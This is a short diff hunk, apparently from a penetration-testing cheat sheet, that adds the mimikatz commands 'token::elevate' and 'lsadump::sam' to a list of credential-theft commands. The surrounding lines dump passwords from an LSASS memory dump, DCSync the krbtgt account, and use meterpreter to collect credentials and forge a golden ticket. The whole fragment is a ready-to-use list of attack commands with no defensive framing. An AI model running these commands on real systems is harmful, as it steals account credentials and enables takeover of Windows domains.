@@ -3245,6 +3245,8 @@ lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
 .\mimikatz.exe
 sekurlsa::minidump /users/admin/Desktop/lsass.DMP
 sekurlsa::LogonPasswords
+token::elevate
+lsadump::sam
 meterpreter > getprivs
 meterpreter > creds_all
 meterpreter > golden_ticket_create
